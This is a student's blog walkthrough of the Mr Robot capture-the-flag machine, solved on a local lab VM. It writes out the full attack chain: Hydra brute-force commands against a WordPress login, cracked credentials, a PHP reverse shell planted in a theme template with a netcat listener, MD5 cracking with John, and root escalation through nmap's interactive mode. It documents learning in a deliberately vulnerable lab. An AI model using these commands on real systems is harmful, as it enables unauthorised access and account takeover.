---
title: "Tryhackme Mr Robot Journey"
date: 2019-02-22T15:25:40+11:00
draft: true
---

## Tryhackme Mr Robot Journey

I attempted the Tryhackme Mr Robot Machine/CTF.

First off, I had to set up the network to deploy the Mr. Robot virtual machine.

I went to the access page and downloaded my configuration file and then downloaded the OpenVPN Source (in .zip file).

When I was following the commands given in INSTALL or README file:

* ./configure
* make
* make-install

During the ./configure command, it encountered errors.

configure: error: openssl check failed

I searched the error and found a stackoverflow article.

Ref: https://superuser.com/questions/371901/openssl-missing-during-configure-how-to-fix

I used the command suggested.

sudo apt-get install libssl-dev

However, even after installing that package, it still did not work.

Upon further inspection, the How to Connect? section, I saw that there was a difference between the general commands and the ones suggested.

Trying the other commands that were suggested. Replacing 'username' with the actual username.

sudo apt install openvpn
sudo openvpn username.ovpn

After entering those commands in, I successfully connected to the network.

Once I connected to the network, I deployed the machine to find the 3 keys.

I typed the ip address into the web browser and loaded the page up. At first I thought it was wrong, but after a second refresh of the page, I realised that the page was intentionally jet black for a reason.

I inspected the source code and started looking for vulnerabilities. There wasn't anything especially eye popping that showed any hints.

My first instinct was to check if robots.txt was configured correctly.

Going to my active machine's ip address followed by "/robots.txt", allowed me to find some hints.

There was 2 things listed:

* fsocity.dic
* key-1-of-3.txt

Navigating to the key-1-of-3.txt allowed me to get my first key for the challenge. I submitted that into the website and confirmed that it was correct.

Due to worrying about whether if was sufficient time for my connection, I added an extra hour.

Afterwards, I tried navigating to the second file fsocity.dic . It initiated a download for a C source code file. It was only a 6.9MB file, but due to slow network speeds with the vpn, it was estimated at a half an hour wait instead of a 2 second wait with the usual UTS network speeds. After reaching 1.8MB of the 6.9MB file, it failed to download. I tried it 2 more times, but I failed to download the file. Since the file could not be downloaded, I asked around the classroom to see if anyone else was attempting the same challenge and found out that Andy, one of my team members for my group project in the studio was attempting the same thing. So I asked to see if he could share the file with me and he was happy to do so. So I obtained the file through a temporary file share to not compromise the normal OS, leaving it only in Kali Linux OS.

After navigating back to the main ip address given, it has logged me into root@fsociety in a terminal.

It provided me with a few commands to use:

* prepare
* fsociety
* inform
* question
* wakeup
* join


After a few more attempts to operate with the website, it wouldn't load correctly.

Hence, I asked Darsh to see whether if there was a different way of going about it. Since there is a VM for Mr Robot, I was suggested to download the Mr Robot VM from Vulnhub and then reattempt it.

After downloading and loading the Mr Robot VM up, I started with a few commands that I learnt from the Deloitte Piper VM challenge.

ifconfig (check for ip address - inet)
nmap 192.168.92.128/24 (scan a subnet)

As a result of the nmap, I found a port 53 open for the domain on 192.168.92.2 .

nmap -sV 192.168.92.2

It did not find any service version with -sV flag.

When I was trying to get back to the same point for the robots.txt.

curl 192.168.92.2/robots.txt
curl http://192.168.92.2/robots.txt
curl 192.168.92.2:53/robots.txt

It didn't work. There was nothing to return. It was empty.

Hence, realising that there was no web due to no port 80 return on the nmap. I thought that there might have been something wrong with the network settings downloaded with the VM. When I checked it, it was Bridged, so I changed it to NAT and restarted the Mr Robot VM.

Afterwards I did another nmap and found the port 80 and port 443 open for 192.168.92.131 .

Afterwards, using curl again.

curl 192.168.92.131/robots.txt

I was able to succesfully return to seeing the robots.txt containing the two files: fsocity.dic and key-1-of-3.txt . This confirms that I was able to successfully connect to the Mr Robot VM.

Afterwards, I reattempted to get fsocity.dic file.

curl 192.168.92.131/fsocity.dic

{{< figure src="/img/mrrobot/1-fsocity.PNG">}}

Realising that it was a big dictionary/wordlist, I placed the output in a wordlist.txt file. It is stored in the current directory that the terminal is operating under.

{{< figure src="/img/mrrobot/2-wordlist.PNG">}}

Running a word count

wc wordlist.txt (7245381)

{{< figure src="/img/mrrobot/3-wc.PNG">}}

Scrolling briefly through the list, I notice that there is duplicates, so I tried to sort by unique entries only.

So we try to filter it out and remove all duplicates and leave only unique entries.

cat wordlist.txt | sort | uniq > wordlist_unique.txt

{{< figure src="/img/mrrobot/4-sortuniq.PNG">}}

Checking the word count again, we see the difference.

wc wordlist_unique.txt (96747)

{{< figure src="/img/mrrobot/5-uniquetxt.PNG">}}

Since I don't know what to use it for. I'll look around more with nikto.

nikto -h 192.168.92.131

{{< figure src="/img/mrrobot/6-nikto.PNG">}}

Looking through the output with wp-links-opml.php and wp-login. We can tell that it is wordpress.

Using wp-scan I tried to enumerate the usernames.

wpscan --url http://192.168.92.131 --enumerate u

However, it shows: "Scan Aborted: The remote site is up, but does not seem to be running wordpress."

{{< figure src="/img/mrrobot/7-wpscanNotwork.PNG">}}

Well, ain't that freaking perfect! It cannot detect it as a wordpress site.

Just to confirm, I navigate to the address: http://192.168.92.131/wp-login.php

Wallah! It's there alright! So after multiple attempts at trying to run wpscan without success, I had to find another way.

Since I did learn about Hydra for Brute-forcing from one of the Hack The Box Challenges, I tried my luck with it.

After checking the source code on the wp-login.php page, we find out that the username box has the name="log" and the password box has the name="pwd". Observing the method for the form, we can tell it is method="post". The "Log In" button has the name="wp-submit" with the value="Log In". The next two lines below the code for the Log In button indicates that it redirects to 192.168.92.131/wp-admin and also there is a cookie value of 1 (name="testcookie" value="1").

{{< figure src="/img/mrrobot/8-log.PNG">}}

{{< figure src="/img/mrrobot/9-pwd.PNG">}}

{{< figure src="/img/mrrobot/10-post.PNG">}}

{{< figure src="/img/mrrobot/11-submit.PNG">}}

{{< figure src="/img/mrrobot/12-hidden.PNG">}}

curl with verbose on.

curl -v 192.168.92.131/wp-login.php

Building the hydra command. No idea what the password is, so putting a filler password -p (examplepwd). Using -L for wordlist, post form and username and password. Checking for failure message "Invalid username". Using 64 threads.

hydra -L wordlist_unique.txt -p examplepwd 192.168.92.131 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' -t 64


Found username: elliot

{{< figure src="/img/mrrobot/14-hydraUsername.PNG">}}

Now iterating through the wordlist to find the password.

hydra -l elliot -P wordlist_unique.txt 192.168.92.131 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 64

| Username | Password  |
|----------|-----------|
| elliot   | ER28-0652 |

{{< figure src="/img/mrrobot/13-hydraPassword.PNG">}}

After logging in and exploring around, I found a way to get php code into the 404.php template under Appearance --> Editor-->404.php.

{{< figure src="/img/mrrobot/15-404php.PNG">}}

Using the reverse shell from pentestmonkey: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Just need to change ip & port.

ip: 192.168.92.128
port: 5050

Using port 5050 because my uni has a saying that using port 5050 has a 50/50 chance of working.

Listen to port 5050

nc -lnvp 5050

Find out who you are logged in as in the reverse shell.

whoami

Look for the key in the home directory.

ls
cd home/robot

There's two files:
key-2-of-3.txt
password.raw-md5

Tried to view key-2-of-3.txt, but permission denied.

Checked permissions

ls -la

Found username: robot

Check password file.

cat password.raw-md5

c3fcd3d76192e4007dfb496cca67e13b

We'll try using the password inside the file with the username 'robot'.

Have to get into terminal.

check python

which python
python -v

python -c 'import pty; pty.spawn("/bin/bash");'

su robot
password: c3fcd3d76192e4007dfb496cca67e13b

Obviously it didn't work.

Put hashed password in a txt file in your local terminal.

vim passwordhash.txt

(i) for input (to edit)

Paste the password hash in and save.

Paste (CTRL + SHIFT + V)

Write and Quit = Save (ESC + SHIFT + : + wq + ENTER)

sudo gunzip /usr/share/wordlists/rockyou.txt.gz

wc -l /usr/share/wordlists/rockyou.txt

Use John the Ripper on the password hashed in md5 with rockyou.txt

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt passwordhash.txt


The password turns out to be: abcdefghijklmnopqrstuvwxyz

Seriously?

Anyways, proceeding with this newfound password, we go back to the reverse shell.

su robot
password: abcdefghijklmnopqrstuvwxyz

In robot@linux:

ls
cat key-2-of-3.txt

Key 2 Found!

Couldn't find root, so trying privesc.

Looking at setuid (SUID) binaries.

find / -user root -perm -4000 2>/dev/null

After some research, old versions of nmap have a known privesc attack via interactive mode.

nmap --interactive

Launch shell

!sh

Check who you are.

whoami

We have root access.

cd ..
ls
cd ..
ls
cd root
cat key-3-of-3.txt

Key 3 Found!

tl;dr
```
ifconfig (get inet - ip address)

nmap -sV -T4 192.168.92.128/24 (nmap scan subnet, looking for service and version with T4 speed for ip address)

netdiscover -r 192.168.92.128/24 (cleaner output)

curl 192.168.92.131 (Generally, not 1,2 or 254)

curl 192.168.92.131/robots.txt (robots.txt is a common file)

curl 192.168.92.131/key-1-of-3.txt (first key)

curl 192.168.92.131/fsocity.dic (big dictionary/wordlist)

curl 192.168.92.131/fsocity.dic > wordlist.txt (store in wordlist.txt of current directory used for terminal)

ls

wc wordlist.txt (word count)

cat wordlist.txt | sort | uniq > wordlist_unique.txt (Remove all duplicates, leave only unique single entries)

wc wordlist_unique.txt (word count on filtered list)

nikto -h 192.168.92.131 (reveals wordpress)

```

Couldn't use wpscan, so using hydra to brute-force.

Finding username first.

```
hydra -L wordlist_unique.txt -p examplepwd 192.168.92.131 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' -t 64
```

Finding password.

```
hydra -l elliot -P wordlist_unique.txt 192.168.92.131 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 64
```
Login with username and password.
Username: elliot
Password: ER28-0652

Appearance --> Editor-->404.php

Replace with reverse shell php from pentestmonkey.

Change ip & port.

ip: 192.168.92.128
port: 5050

Listen to port 5050
```
nc -lnvp 5050
```
Find out who you are.

```
whoami
```
Check files in home/robot folder

```
ls
cd home/robot
```

Get terminal

```
python -c 'import pty; pty.spawn("/bin/bash");'
```
Crack md5 hash (password hash)

c3fcd3d76192e4007dfb496cca67e13b

```
su robot
abcdefghijklmnopqrstuvwxyz

```

(Second Key)
```
ls
cat key-2-of-3.txt
```

Find SUID binaries for privesc

```
find / -user root -perm -4000 2>/dev/null
```

nmap is able to privesc with intereactive mode

```
nmap --interactive
```

Launch shell

```
!sh
```

Check who you are.

```
whoami
```

Move to root directory (Third Key):

```
cd ..
ls
cd ..
ls
cd root
cat key-3-of-3.txt
```

DONE
